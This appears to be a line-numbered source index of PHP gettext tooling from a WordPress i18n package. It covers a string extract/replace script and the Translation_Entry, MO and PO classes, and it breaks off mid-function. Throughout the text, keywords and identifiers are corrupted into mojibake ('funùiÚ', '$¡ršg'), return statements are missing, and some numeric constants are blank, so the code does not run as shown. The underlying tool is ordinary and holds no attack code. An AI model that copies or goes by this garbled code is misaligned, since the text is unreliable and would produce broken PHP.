$glob®_¬¿y_Çme
, 
$f’ame
) {

72 
$a
 = 
$glob®_¬¿y_Çme
;

73  
	`ü—‹_funùiÚ
('$¡ršg, $comm’t_id, $lše_numb”', 'glob® $'.
$a
.'; $'.$a.'[] =‡¼ay($¡ršg, $comm’t_id, '.
	`v¬_expÜt
(
$f’ame
, 
Œue
).', $line_number);');

74 
	}
}

76 
funùiÚ
 
	$make_mo_»¶aûr
(
$glob®_mo_Çme
) {

77 
$m
 = 
$glob®_mo_Çme
;

78  
	`ü—‹_funùiÚ
('$tok’, $¡ršg', 'glob® $'.
$m
.';„eturn var_export($'.$m.'->translate($string),rue);');

79 
	}
}

81 
funùiÚ
 
	$w®k_tok’s
(&
$tok’s
, 
$¡ršg_aùiÚ
, 
$Ùh”_aùiÚ
, 
$»gi¡”_aùiÚ
=
nuÎ
) {

83 
$cu¼’t_comm’t_id
 = '';

84 
$cu¼’t_¡ršg
 = '';

85 
$cu¼’t_¡ršg_lše
 = 0;

87 
$»suÉ
 = '';

88 
$lše
 = 1;

90 
	`fÜ—ch
(
$tok’s
 
as
 
$tok’
) {

91 ià(
	`is_¬¿y
(
$tok’
)) {

92 
	`li¡
(
$id
, 
$‹xt
èğ
$tok’
;

93 
$lše
 +ğ
	`sub¡r_couÁ
(
$‹xt
, "\n");

94 ià((
T_ML_COMMENT
 =ğ
$id
 || 
T_COMMENT
 =ğ$idè&& 
	`´eg_m©ch
('|/\*\s*(/?WP_I18N_[a-z_]+)\s*\*/|i', 
$‹xt
, 
$m©ches
)) {

95 ià(
$this
->
STAGE_OUTSIDE
 =ğ
$¡age
) {

96 
$¡age
 = 
$this
->
STAGE_START_COMMENT
;

97 
$cu¼’t_comm’t_id
 = 
$m©ches
[1];

98 
$this
->
	`logmsg
('¡¬ˆcomm’t', 
$cu¼’t_comm’t_id
);

99 
$»suÉ
 .ğ
	`ÿÎ_u£r_func
(
$Ùh”_aùiÚ
, 
$tok’
);

102 ià(
$this
->
STAGE_START_COMMENT
 <ğ
$¡age
 && $¡ag<ğ$this->
STAGE_WHITESPACE_AFTER
 && '/'.
$cu¼’t_comm’t_id
 =ğ
$m©ches
[1]) {

103 
$¡age
 = 
$this
->
STAGE_END_COMMENT
;

104 
$this
->
	`logmsg
('’d comm’t', 
$cu¼’t_comm’t_id
);

105 
$»suÉ
 .ğ
	`ÿÎ_u£r_func
(
$Ùh”_aùiÚ
, 
$tok’
);

106 ià(!
	`is_nuÎ
(
$»gi¡”_aùiÚ
)è
	`ÿÎ_u£r_func
($»gi¡”_aùiÚ, 
$cu¼’t_¡ršg
, 
$cu¼’t_comm’t_id
, 
$cu¼’t_¡ršg_lše
);

109 } ià(
T_CONSTANT_ENCAPSED_STRING
 =ğ
$id
) {

110 ià(
$this
->
STAGE_START_COMMENT
 <ğ
$¡age
 && $¡ag< $this->
STAGE_WHITESPACE_AFTER
) {

111 
	`ev®
('$cu¼’t_¡ršg='.
$‹xt
.';');

112 
$this
->
	`logmsg
('¡ršg', 
$cu¼’t_¡ršg
);

113 
$cu¼’t_¡ršg_lše
 = 
$lše
;

114 
$»suÉ
 .ğ
	`ÿÎ_u£r_func
(
$¡ršg_aùiÚ
, 
$tok’
, 
$cu¼’t_¡ršg
);

117 } ià(
T_WHITESPACE
 =ğ
$id
) {

118 ià(
$this
->
STAGE_START_COMMENT
 <ğ
$¡age
 && $¡ag< $this->
STAGE_STRING
) {

119 
$¡age
 = 
$this
->
STAGE_WHITESPACE_BEFORE
;

120 
$this
->
	`logmsg
('whitespace before');

121 
$»suÉ
 .ğ
	`ÿÎ_u£r_func
(
$Ùh”_aùiÚ
, 
$tok’
);

124 ià(
$this
->
STAGE_STRING
 < 
$¡age
 && $¡ag< $this->
STAGE_END_COMMENT
) {

125 
$¡age
 = 
$this
->
STAGE_WHITESPACE_AFTER
;

126 
$this
->
	`logmsg
('whitespace‡fter');

127 
$»suÉ
 .ğ
	`ÿÎ_u£r_func
(
$Ùh”_aùiÚ
, 
$tok’
);

132 
$»suÉ
 .ğ
	`ÿÎ_u£r_func
(
$Ùh”_aùiÚ
, 
$tok’
);

133 
$¡age
 = 
$this
->
STAGE_OUTSIDE
;

134 
$cu¼’t_comm’t_id
 = '';

135 
$cu¼’t_¡ršg
 = '';

136 
$cu¼’t_¡ršg_lše
 = 0;

138  
$»suÉ
;

139 
	}
}

142 
funùiÚ
 
	$commªd_exŒaù
() {

143 
$¬gs
 = 
	`func_g‘_¬gs
();

144 
$pÙ_f’ame
 = 
$¬gs
[0];

145 ià(
	`is£t
(
$¬gs
[1]è&& 
	`is_¬¿y
($args[1]))

146 
$f’ames
 = 
$¬gs
[1];

148 
$f’ames
 = 
	`¬¿y_¦iû
(
$¬gs
, 1);

150 
$glob®_Çme
 = '__’Œ›s_'.
	`mt_¿nd
(1, 1000);

151 
$GLOBALS
[
$glob®_Çme
] = 
	`¬¿y
();

153 
	`fÜ—ch
(
$f’ames
 
as
 
$f’ame
) {

154 
$tok’s
 = 
	`tok’_g‘_®l
(
	`fe_g‘_cÚ‹Ás
(
$f’ame
));

155 
$agg»g©Ü
 = 
$this
->
	`make_¡ršg_agg»g©Ü
(
$glob®_Çme
, 
$f’ame
);

156 
$this
->
	`w®k_tok’s
(
$tok’s
, 
	`¬¿y
(&$this, 'ignÜe_tok’'),‡¼ay(&$this, 'ignÜe_tok’'), 
$agg»g©Ü
);

159 
$pÙf
 = '-' =ğ
$pÙ_f’ame
? 
STDOUT
 : @
	`fİ’
($pot_filename, 'a');

160 ià(
çl£
 ==ğ
$pÙf
) {

161 
$this
->
	`şi_d›
("Couldn't open…ot file: $pot_filename");

164 
	`fÜ—ch
(
$GLOBALS
[
$glob®_Çme
] 
as
 
$™em
) {

165 @
	`li¡
(
$¡ršg
, 
$comm’t_id
, 
$f’ame
, 
$lše_numb”
èğ
$™em
;

166 
$f’ame
 = 
	`is£t
($f’ame)? 
	`´eg_»¶aû
('|^\./|', '', $filename) : '';

167 
$»f_lše_numb”
 = 
	`is£t
(
$lše_numb”
)? ":$line_number" : '';

168 
$¬gs
 = 
	`¬¿y
(

169 'sšguÏr' => 
$¡ršg
,

171 '»ã»nûs' => 
	`¬¿y
("$filename$ref_line_number"),

173 
$’Œy
 = 
Ãw
 
	`T¿n¦©iÚ_EÁry
(
$¬gs
);

174 
	`fwr™e
(
$pÙf
, "\n".
PO
::
	`expÜt_’Œy
(
$’Œy
)."\n");

176 ià('-' !ğ
$pÙ_f’ame
è
	`fşo£
(
$pÙf
);

177  
Œue
;

178 
	}
}

180 
funùiÚ
 
	$commªd_»¶aû
() {

181 
$¬gs
 = 
	`func_g‘_¬gs
();

182 
$mo_f’ame
 = 
$¬gs
[0];

183 ià(
	`is£t
(
$¬gs
[1]è&& 
	`is_¬¿y
($args[1]))

184 
$f’ames
 = 
$¬gs
[1];

186 
$f’ames
 = 
	`¬¿y_¦iû
(
$¬gs
, 1);

188 
$glob®_Çme
 = '__mo_'.
	`mt_¿nd
(1, 1000);

189 
$GLOBALS
[
$glob®_Çme
] = 
Ãw
 
	`MO
();

190 
$»¶aûr
 = 
$this
->
	`make_mo_»¶aûr
(
$glob®_Çme
);

192 
$»s
 = 
$GLOBALS
[
$glob®_Çme
]->
	`impÜt_äom_fe
(
$mo_f’ame
);

193 ià(
çl£
 ==ğ
$»s
) {

194 
$this
->
	`şi_d›
("Couldn't„ead MO file '$mo_filename'!");

196 
	`fÜ—ch
(
$f’ames
 
as
 
$f’ame
) {

197 
$sourû
 = 
	`fe_g‘_cÚ‹Ás
(
$f’ame
);

198 iàĞ
	`¡¾’
(
$sourû
) > 150000 ) ;

199 
$tok’s
 = 
	`tok’_g‘_®l
(
$sourû
);

200 
$Ãw_fe
 = 
$this
->
	`w®k_tok’s
(
$tok’s
, 
$»¶aûr
, 
	`¬¿y
(&$this, 'unchanged_token'));

201 
$f
 = 
	`fİ’
(
$f’ame
, 'w');

202 
	`fwr™e
(
$f
, 
$Ãw_fe
);

203 
	`fşo£
(
$f
);

205  
Œue
;

206 
	}
}

208 
funùiÚ
 
	$u§ge
() {

209 
$this
->
	`¡d”r
('php i18n-comments.php COMMAND OUTPUTFILE INPUTFILES');

210 
$this
->
	`¡d”r
('Extracts‡nd„eplaces strings, which cannot be gettexted');

211 
$this
->
	`¡d”r
('Commands:');

212 
$this
->
	`¡d”r
('ƒxtract POTFILE PHPFILES‡ppendshe stringso POTFILE');

213 
$this
->
	`¡d”r
('„eplace MOFILE PHPFILES„eplaces strings in PHPFILES withranslations from MOFILE');

214 
	}
}

216 
funùiÚ
 
	$şi
() {

217 
glob®
 
$¬gv
, 
$commªds
;

218 ià(
	`couÁ
(
$¬gv
è< 4 || !
	`š_¬¿y
($¬gv[1], 
	`¬¿y_keys
(
$this
->
commªds
))) {

219 
$this
->
	`u§ge
();

220 
	`ex™
(1);

222 
	`ÿÎ_u£r_func_¬¿y
(
	`¬¿y
(&
$this
, $this->
commªds
[
$¬gv
[1]]), 
	`¬¿y_¦iû
($argv, 2));

223 
	}
}

228 
	g$šşuded_fes
 = 
g‘_šşuded_fes
();

229 iàĞ
	g$šşuded_fes
[0] =ğ
__FILE__
 ) {

235 
ex™
( 'Locked' );

237 
”rÜ_»pÜtšg
(
E_ALL
);

238 
	g$nÙ_g‘‹x‹d
 = 
Ãw
 
NÙG‘‹x‹d
;

239 
	g$nÙ_g‘‹x‹d
->
şi
();

	@i18n/makepot/pomo/entry.php

1 <?
php


10 iàĞ!
şass_exi¡s
( 'Translation_Entry' ) ):

14 şas 
	cT¿n¦©iÚ_EÁry
 {

21 
v¬
 
$is_¶u¿l
 = 
çl£
;

23 
v¬
 
	m$cÚ‹xt
 = 
nuÎ
;

24 
v¬
 
	m$sšguÏr
 = 
nuÎ
;

25 
v¬
 
	m$¶u¿l
 = 
nuÎ
;

26 
v¬
 
	m$Œª¦©iÚs
 = 
¬¿y
();

27 
v¬
 
	m$Œª¦©Ü_comm’ts
 = '';

28 
v¬
 
	m$exŒaùed_comm’ts
 = '';

29 
v¬
 
	m$»ã»nûs
 = 
¬¿y
();

30 
v¬
 
	m$æags
 = 
¬¿y
();

43 
funùiÚ
 
T¿n¦©iÚ_EÁry
(
$¬gs
=
	$¬¿y
()) {

45 ià(!
	`is£t
(
$¬gs
['singular'])) {

49 
	`fÜ—ch
 (
$¬gs
 
as
 
$v¬Çme
 => 
$v®ue
) {

50 
$this
->
$v¬Çme
 = 
$v®ue
;

52 ià(
	`is£t
(
$¬gs
['¶u¿l'])è
$this
->
is_¶u¿l
 = 
Œue
;

53 ià(!
	`is_¬¿y
(
$this
->
Œª¦©iÚs
)è$this->Œª¦©iÚ ğ
	`¬¿y
();

54 ià(!
	`is_¬¿y
(
$this
->
»ã»nûs
)è$this->»ã»nû ğ
	`¬¿y
();

55 ià(!
	`is_¬¿y
(
$this
->
æags
)è$this->æag ğ
	`¬¿y
();

63 
funùiÚ
 
	$key
() {

64 ià(
	`is_nuÎ
(
$this
->
sšguÏr
)è 
çl£
;

66  
	`is_nuÎ
(
$this
->
cÚ‹xt
)? $this->
sšguÏr
 : $this->cÚ‹xt.
	`chr
(4).$this->singular;

67 
	}
}

69 
funùiÚ
 
	$m”ge_w™h
(&
$Ùh”
) {

70 
$this
->
æags
 = 
	`¬¿y_unique
Ğ
	`¬¿y_m”ge
Ğ$this->æags, 
$Ùh”
->flags ) );

71 
$this
->
»ã»nûs
 = 
	`¬¿y_unique
Ğ
	`¬¿y_m”ge
Ğ$this->»ã»nûs, 
$Ùh”
->references ) );

72 iàĞ
$this
->
exŒaùed_comm’ts
 !ğ
$Ùh”
->extracted_comments ) {

73 
$this
->
exŒaùed_comm’ts
 .ğ
$Ùh”
->extracted_comments;

76 
	}
}

78 
	g’dif
;

	@i18n/makepot/pomo/mo.php

1 <?
php


10 
»quœe_Úû
 
dœÇme
(
__FILE__
) . '/translations.php';

11 
»quœe_Úû
 
dœÇme
(
__FILE__
) . '/streams.php';

13 iàĞ!
şass_exi¡s
( 'MO' ) ):

14 şas 
	cMO
 
ex‹nds
 
G‘‹xt_T¿n¦©iÚs
 {

16 
v¬
 
$_Ålu¿ls
 = 2;

23 
funùiÚ
 
	$impÜt_äom_fe
(
$f’ame
) {

24 
$»ad”
 = 
Ãw
 
	`POMO_FeR—d”
(
$f’ame
);

25 ià(!
$»ad”
->
	`is_»sourû
())

26  
çl£
;

27  
$this
->
	`impÜt_äom_»ad”
(
$»ad”
);

30 
funùiÚ
 
	$expÜt_to_fe
(
$f’ame
) {

31 
$fh
 = 
	`fİ’
(
$f’ame
, 'wb');

32 iàĞ!
$fh
 )  
çl£
;

33 
$»s
 = 
$this
->
	`expÜt_to_fe_hªdË
Ğ
$fh
 );

34 
	`fşo£
(
$fh
);

35  
$»s
;

36 
	}
}

38 
funùiÚ
 
	$expÜt
() {

39 
$tmp_fh
 = 
	`fİ’
("php://temp", 'r+');

40 iàĞ!
$tmp_fh
 )  
çl£
;

41 
$this
->
	`expÜt_to_fe_hªdË
Ğ
$tmp_fh
 );

42 
	`»wšd
Ğ
$tmp_fh
 );

43  
	`¡»am_g‘_cÚ‹Ás
Ğ
$tmp_fh
 );

44 
	}
}

46 
funùiÚ
 
	$is_’Œy_good_fÜ_expÜt
Ğ
$’Œy
 ) {

47 iàĞ
	`em±y
Ğ
$’Œy
->
Œª¦©iÚs
 ) ) {

48  
çl£
;

51 iàĞ!
	`¬¿y_f‹r
Ğ
$’Œy
->
Œª¦©iÚs
 ) ) {

52  
çl£
;

55  
Œue
;

56 
	}
}

58 
funùiÚ
 
	$expÜt_to_fe_hªdË
(
$fh
) {

59 
$’Œ›s
 = 
	`¬¿y_f‹r
Ğ
$this
->
’Œ›s
, 
	`¬¿y
( $this, 'is_entry_good_for_export' ) );

60 
	`ksÜt
(
$’Œ›s
);

61 
$magic
 = 0x950412de;

62 
$»visiÚ
 = 0;

63 
$tÙ®
 = 
	`couÁ
(
$’Œ›s
) + 1;

64 
$Üigš®s_Ënghts_addr
 = 28;

65 
$Œª¦©iÚs_Ënghts_addr
 = 
$Üigš®s_Ënghts_addr
 + 8 * 
$tÙ®
;

66 
$size_of_hash
 = 0;

67 
$hash_addr
 = 
$Œª¦©iÚs_Ënghts_addr
 + 8 * 
$tÙ®
;

68 
$cu¼’t_addr
 = 
$hash_addr
;

69 
	`fwr™e
(
$fh
, 
	`·ck
('V*', 
$magic
, 
$»visiÚ
, 
$tÙ®
, 
$Üigš®s_Ënghts_addr
,

70 
$Œª¦©iÚs_Ënghts_addr
, 
$size_of_hash
, 
$hash_addr
));

71 
	`f£ek
(
$fh
, 
$Üigš®s_Ënghts_addr
);

74 
	`fwr™e
(
$fh
, 
	`·ck
('VV', 0, 
$cu¼’t_addr
));

75 
$cu¼’t_addr
++;

76 
$Üigš®s_bË
 = 
	`chr
(0);

78 
	`fÜ—ch
(
$’Œ›s
 
as
 
$’Œy
) {

79 
$Üigš®s_bË
 .ğ
$this
->
	`expÜt_Üigš®
(
$’Œy
è. 
	`chr
(0);

80 
$Ëngth
 = 
	`¡¾’
(
$this
->
	`expÜt_Üigš®
(
$’Œy
));

81 
	`fwr™e
(
$fh
, 
	`·ck
('VV', 
$Ëngth
, 
$cu¼’t_addr
));

82 
$cu¼’t_addr
 +ğ
$Ëngth
 + 1;

85 
$expÜ‹d_h—d”s
 = 
$this
->
	`expÜt_h—d”s
();

86 
	`fwr™e
(
$fh
, 
	`·ck
('VV', 
	`¡¾’
(
$expÜ‹d_h—d”s
), 
$cu¼’t_addr
));

87 
$cu¼’t_addr
 +ğ
	`¡¾’
(
$expÜ‹d_h—d”s
) + 1;

88 
$Œª¦©iÚs_bË
 = 
$expÜ‹d_h—d”s
 . 
	`chr
(0);

90 
	`fÜ—ch
(
$’Œ›s
 
as
 
$’Œy
) {

91 
$Œª¦©iÚs_bË
 .ğ
$this
->
	`expÜt_Œª¦©iÚs
(
$’Œy
è. 
	`chr
(0);

92 
$Ëngth
 = 
	`¡¾’
(
$this
->
	`expÜt_Œª¦©iÚs
(
$’Œy
));

93 
	`fwr™e
(
$fh
, 
	`·ck
('VV', 
$Ëngth
, 
$cu¼’t_addr
));

94 
$cu¼’t_addr
 +ğ
$Ëngth
 + 1;

97 
	`fwr™e
(
$fh
, 
$Üigš®s_bË
);

98 
	`fwr™e
(
$fh
, 
$Œª¦©iÚs_bË
);

99  
Œue
;

100 
	}
}

102 
funùiÚ
 
	$expÜt_Üigš®
(
$’Œy
) {

104 
$expÜ‹d
 = 
$’Œy
->
sšguÏr
;

105 ià(
$’Œy
->
is_¶u¿l
è
$expÜ‹d
 .ğ
	`chr
(0).$’Œy->
¶u¿l
;

106 ià(!
	`is_nuÎ
(
$’Œy
->
cÚ‹xt
)è
$expÜ‹d
 = $’Œy->cÚ‹xˆ. 
	`chr
(4) . $exported;

107  
$expÜ‹d
;

108 
	}
}

110 
funùiÚ
 
	$expÜt_Œª¦©iÚs
(
$’Œy
) {

112  
	`im¶ode
(
	`chr
(0), 
$’Œy
->
Œª¦©iÚs
);

113 
	}
}

115 
funùiÚ
 
	$expÜt_h—d”s
() {

116 
$expÜ‹d
 = '';

117 
	`fÜ—ch
(
$this
->
h—d”s
 
as
 
$h—d”
 => 
$v®ue
) {

118 
$expÜ‹d
.= "$header: $value\n";

120  
$expÜ‹d
;

121 
	}
}

123 
funùiÚ
 
	$g‘_by‹Üd”
(
$magic
) {

127 
$magic_l™e
 = () - 1794895138;

128 
$magic_l™e_64
 = () 2500072158;

130 
$magic_big
 = (() - 569244523) & 0xFFFFFFFF;

131 ià(
$magic_l™e
 =ğ
$magic
 || 
$magic_l™e_64
 == $magic) {

133 } ià(
$magic_big
 =ğ
$magic
) {

136  
çl£
;

138 
	}
}

140 
funùiÚ
 
	$impÜt_äom_»ad”
(
$»ad”
) {

141 
$’dŸn_¡ršg
 = 
MO
::
	`g‘_by‹Üd”
(
$»ad”
->
	`»adšt32
());

142 ià(
çl£
 ==ğ
$’dŸn_¡ršg
) {

143  
çl£
;

145 
$»ad”
->
	`£tEndŸn
(
$’dŸn_¡ršg
);

147 
$’dŸn
 = ('big' =ğ
$’dŸn_¡ršg
)? 'N' : 'V';

149 
$h—d”
 = 
$»ad”
->
	`»ad
(24);

150 ià(
$»ad”
->
	`¡¾’
(
$h—d”
) != 24)

151  
çl£
;

154 
$h—d”
 = 
	`uÅack
("{$endian}revision/{$endian}total/{$endian}originals_lenghts_addr/{$endian}translations_lenghts_addr/{$endian}hash_length/{$endian}hash_addr", $header);

155 ià(!
	`is_¬¿y
(
$h—d”
))

156  
çl£
;

158 
	`exŒaù
Ğ
$h—d”
 );

161 ià(
$»visiÚ
 != 0)

162  
çl£
;

165 
$»ad”
->
	`£ekto
(
$Üigš®s_Ënghts_addr
);

168 
$Üigš®s_Ëngths_Ëngth
 = 
$Œª¦©iÚs_Ënghts_addr
 - 
$Üigš®s_Ënghts_addr
;

169 iàĞ
$Üigš®s_Ëngths_Ëngth
 !ğ
$tÙ®
 * 8 )

170  
çl£
;

172 
$Üigš®s
 = 
$»ad”
->
	`»ad
(
$Üigš®s_Ëngths_Ëngth
);

173 iàĞ
$»ad”
->
	`¡¾’
Ğ
$Üigš®s
 ) !ğ
$Üigš®s_Ëngths_Ëngth
 )

174  
çl£
;

177 
$Œª¦©iÚs_Ënghts_Ëngth
 = 
$hash_addr
 - 
$Œª¦©iÚs_Ënghts_addr
;

178 iàĞ
$Œª¦©iÚs_Ënghts_Ëngth
 !ğ
$tÙ®
 * 8 )

179  
çl£
;

181 
$Œª¦©iÚs
 = 
$»ad”
->
	`»ad
(
$Œª¦©iÚs_Ënghts_Ëngth
);

182 iàĞ
$»ad”
->
	`¡¾’
Ğ
$Œª¦©iÚs
 ) !ğ
$Œª¦©iÚs_Ënghts_Ëngth
 )

183  
çl£
;

186 
$Üigš®s
 = 
$»ad”
->
	`¡r_¥l™
( $originals, 8 );

187 
$Œª¦©iÚs
 = 
$»ad”
->
	`¡r_¥l™
( $translations, 8 );

190 
$¡ršgs_addr
 = 
$hash_addr
 + 
$hash_Ëngth
 * 4;

192 
$»ad”
->
	`£ekto
(
$¡ršgs_addr
);

194 
$¡ršgs
 = 
$»ad”
->
	`»ad_®l
();

195 
$»ad”
->
	`şo£
();

197  
$i
 = 0; $˜< 
$tÙ®
; $i++ ) {

198 
$o
 = 
	`uÅack
Ğ"{$’dŸn}Ëngth/{$’dŸn}pos", 
$Üigš®s
[
$i
] );

199 
$t
 = 
	`uÅack
Ğ"{$’dŸn}Ëngth/{$’dŸn}pos", 
$Œª¦©iÚs
[
$i
] );

200 iàĞ!
$o
 || !
$t
 )  
çl£
;

203 
$o
['pos'] -ğ
$¡ršgs_addr
;

204 
$t
['pos'] -ğ
$¡ršgs_addr
;

206 
$Üigš®
 = 
$»ad”
->
	`sub¡r
Ğ
$¡ršgs
, 
$o
['pos'], $o['length'] );

207 
$Œª¦©iÚ
 = 
$»ad”
->
	`sub¡r
Ğ
$¡ršgs
, 
$t
['pos'], $t['length'] );

209 ià('' ==ğ
$Üigš®
) {

210 
$this
->
	`£t_h—d”s
($this->
	`make_h—d”s
(
$Œª¦©iÚ
));

212 
$’Œy
 = &
$this
->
	`make_’Œy
(
$Üigš®
, 
$Œª¦©iÚ
);

213 
$this
->
’Œ›s
[
$’Œy
->
	`key
()] = &$entry;

216  
Œue
;

217 
	}
}

229 
	gfunùiÚ
 &
	$make_’Œy
(
$Üigš®
, 
$Œª¦©iÚ
) {

230 
$’Œy
 = 
Ãw
 
	`T¿n¦©iÚ_EÁry
();

232 
$·¹s
 = 
	`ex¶ode
(
	`chr
(4), 
$Üigš®
);

233 ià(
	`is£t
(
$·¹s
[1])) {

234 
$Üigš®
 = 
$·¹s
[1];

235 
$’Œy
->
cÚ‹xt
 = 
$·¹s
[0];

238 
$·¹s
 = 
	`ex¶ode
(
	`chr
(0), 
$Üigš®
);

239 
$’Œy
->
sšguÏr
 = 
$·¹s
[0];

240 ià(
	`is£t
(
$·¹s
[1])) {

241 
$’Œy
->
is_¶u¿l
 = 
Œue
;

242 
$’Œy
->
¶u¿l
 = 
$·¹s
[1];

245 
$’Œy
->
Œª¦©iÚs
 = 
	`ex¶ode
(
	`chr
(0), 
$Œª¦©iÚ
);

246  
$’Œy
;

247 
	}
}

249 
funùiÚ
 
	$£Ëù_¶u¿l_fÜm
(
$couÁ
) {

250  
$this
->
	`g‘‹xt_£Ëù_¶u¿l_fÜm
(
$couÁ
);

251 
	}
}

253 
funùiÚ
 
	$g‘_¶u¿l_fÜms_couÁ
() {

254  
$this
->
_Ålu¿ls
;

255 
	}
}

257 
	g’dif
;

	@i18n/makepot/pomo/po.php

1 <?
php


10 
»quœe_Úû
 
dœÇme
(
__FILE__
) . '/translations.php';

12 
defše
('PO_MAX_LINE_LEN', 79);

14 
ši_£t
('auto_detect_line_endings', 1);

19 iàĞ!
şass_exi¡s
( 'PO' ) ):

20 şas 
	cPO
 
ex‹nds
 
G‘‹xt_T¿n¦©iÚs
 {

22 
v¬
 
$comm’ts_befÜe_h—d”s
 = '';

29 
funùiÚ
 
	$expÜt_h—d”s
() {

30 
$h—d”_¡ršg
 = '';

31 
	`fÜ—ch
(
$this
->
h—d”s
 
as
 
$h—d”
 => 
$v®ue
) {

32 
$h—d”_¡ršg
.= "$header: $value\n";

34 
$poif›d
 = 
PO
::
	`poify
(
$h—d”_¡ršg
);

35 ià(
$this
->
comm’ts_befÜe_h—d”s
)

36 
$befÜe_h—d”s
 = 
$this
->
	`´•’d_—ch_lše
(
	`¹rim
($this->
comm’ts_befÜe_h—d”s
)."\n", '# ');

38 
$befÜe_h—d”s
 = '';

39  
	`¹rim
("{$before_headers}msgid \"\"\nmsgstr $poified");

47 
funùiÚ
 
	$expÜt_’Œ›s
() {

49  
	`im¶ode
("\n\n", 
	`¬¿y_m­
(
	`¬¿y
('PO', 'expÜt_’Œy'), 
$this
->
’Œ›s
));

50 
	}
}

58 
funùiÚ
 
	$expÜt
(
$šşude_h—d”s
 = 
Œue
) {

59 
$»s
 = '';

60 ià(
$šşude_h—d”s
) {

61 
$»s
 .ğ
$this
->
	`expÜt_h—d”s
();

62 
$»s
 .= "\n\n";

64 
$»s
 .ğ
$this
->
	`expÜt_’Œ›s
();

65  
$»s
;

66 
	}
}

75 
funùiÚ
 
	$expÜt_to_fe
(
$f’ame
, 
$šşude_h—d”s
 = 
Œue
) {

76 
$fh
 = 
	`fİ’
(
$f’ame
, 'w');

77 ià(
çl£
 ==ğ
$fh
)  false;

78 
$expÜt
 = 
$this
->
	`expÜt
(
$šşude_h—d”s
);

79 
$»s
 = 
	`fwr™e
(
$fh
, 
$expÜt
);

80 ià(
çl£
 ==ğ
$»s
)  false;

81  
	`fşo£
(
$fh
);

82 
	}
}

89 
funùiÚ
 
	$£t_comm’t_befÜe_h—d”s
Ğ
$‹xt
 ) {

90 
$this
->
comm’ts_befÜe_h—d”s
 = 
$‹xt
;

91 
	}
}

100 
public
 
funùiÚ
 
	$poify
(
$¡ršg
) {

101 
$quÙe
 = '"';

102 
$¦ash
 = '\\';

103 
$Ãwlše
 = "\n";

105 
$»¶aûs
 = 
	`¬¿y
(

111 
$¡ršg
 = 
	`¡r_»¶aû
(
	`¬¿y_keys
(
$»¶aûs
), 
	`¬¿y_v®ues
($replaces), $string);

113 
$po
 = 
$quÙe
.
	`im¶ode
("${¦ash}n$quÙe$Ãwlše$quÙe", 
	`ex¶ode
(
$Ãwlše
, 
$¡ršg
)).$quote;

115 ià(
çl£
 !=ğ
	`¡½os
(
$¡ršg
, 
$Ãwlše
) &&

116 (
	`sub¡r_couÁ
(
$¡ršg
, 
$Ãwlše
è> 1 || !($Ãwlš==ğ
	`sub¡r
($¡ršg, -
	`¡¾’
($newline))))) {

117 
$po
 = "$quote$quote$newline$po";

120 
$po
 = 
	`¡r_»¶aû
("$newline$quote$quote", '', $po);

121  
$po
;

122 
	}
}

131 
public
 
funùiÚ
 
	$uÅoify
(
$¡ršg
) {

132 
$esÿ³s
 = 
	`¬¿y
('t' => "\t", 'n' => "\n", '\\' => '\\');

133 
$lšes
 = 
	`¬¿y_m­
('Œim', 
	`ex¶ode
("\n", 
$¡ršg
));

134 
$lšes
 = 
	`¬¿y_m­
(
	`¬¿y
('PO', 'trim_quotes'), $lines);

135 
$uÅoif›d
 = '';

136 
$´evious_is_back¦ash
 = 
çl£
;

137 
	`fÜ—ch
(
$lšes
 
as
 
$lše
) {

138 
	`´eg_m©ch_®l
('/./u', 
$lše
, 
$ch¬s
);

139 
$ch¬s
 = $chars[0];

140 
	`fÜ—ch
(
$ch¬s
 
as
 
$ch¬
) {

141 ià(!
$´evious_is_back¦ash
) {

142 ià('\\' =ğ
$ch¬
)

143 
$´evious_is_back¦ash
 = 
Œue
;

145 
$uÅoif›d
 .ğ
$ch¬
;

147 
$´evious_is_back¦ash
 = 
çl£
;

148 
$uÅoif›d
 .ğ
	`is£t
(
$esÿ³s
[
$ch¬
])? $escapes[$char] : $char;

152  
$uÅoif›d
;

153 
	}
}

163 
public
 
funùiÚ
 
	$´•’d_—ch_lše
(
$¡ršg
, 
$w™h
) {

164 
$php_w™h
 = 
	`v¬_expÜt
(
$w™h
, 
Œue
);

165 
$lšes
 = 
	`ex¶ode
("\n", 
$¡ršg
);

167 ià("\n" =ğ
	`sub¡r
(
$¡ršg
, -1)è
	`un£t
(
$lšes
[
	`couÁ
($lines) - 1]);

168 
$»s
 = 
	`im¶ode
("\n", 
	`¬¿y_m­
(
	`ü—‹_funùiÚ
('$x', "»tuº $php_w™h.\$x;"), 
$lšes
));

170 ià("\n" =ğ
	`sub¡r
(
$¡ršg
, -1)è
$»s
 .= "\n";

171  
$»s
;

172 
	}
}

183 
public
 
funùiÚ
 
comm’t_block
(
$‹xt
, 
$ch¬
=' ') {

184 
$‹xt
 = 
wÜdw¿p
($‹xt, 
PO_MAX_LINE_LEN
 - 3);

185  
	gPO
::
´•’d_—ch_lše
(
$‹xt
, "#$char ");

196 
public
 
funùiÚ
 
	$expÜt_’Œy
(&
$’Œy
) {

197 ià(
	`is_nuÎ
(
$’Œy
->
sšguÏr
)è 
çl£
;

198 
$po
 = 
	`¬¿y
();

199 ià(!
	`em±y
(
$’Œy
->
Œª¦©Ü_comm’ts
)è
$po
[] = 
PO
::
	`comm’t_block
($entry->translator_comments);

200 ià(!
	`em±y
(
$’Œy
->
exŒaùed_comm’ts
)è
$po
[] = 
PO
::
	`comm’t_block
($entry->extracted_comments, '.');

201 ià(!
	`em±y
(
$’Œy
->
»ã»nûs
)è
$po
[] = 
PO
::
	`comm’t_block
(
	`im¶ode
(' ', $entry->references), ':');

202 ià(!
	`em±y
(
$’Œy
->
æags
)è
$po
[] = 
PO
::
	`comm’t_block
(
	`im¶ode
(", ", $entry->flags), ',');

203 ià(!
	`is_nuÎ
(
$’Œy
->
cÚ‹xt
)è
$po
[] = 'msgùxˆ'.
PO
::
	`poify
($entry->context);

204 
$po
[] = 'msgid '.
PO
::
	`poify
(
$’Œy
->
sšguÏr
);

205 ià(!
$’Œy
->
is_¶u¿l
) {

206 
$Œª¦©iÚ
 = 
	`em±y
(
$’Œy
->
Œª¦©iÚs
)? '' : $entry->translations[0];

207 
$po
[] = 'msg¡¸'.
PO
::
	`poify
(
$Œª¦©iÚ
);

209 
$po
[] = 'msgid_¶u¿È'.
PO
::
	`poify
(
$’Œy
->
¶u¿l
);

210 
$Œª¦©iÚs
 = 
	`em±y
(
$’Œy
->
Œª¦©iÚs
)? 
	`¬¿y
('', '') : $entry->translations;

211 
	`fÜ—ch
(
$Œª¦©iÚs
 
as
 
$i
 => 
$Œª¦©iÚ
) {

212 
$po
[] = "msg¡r[$i] ".
PO
::
	`poify
(
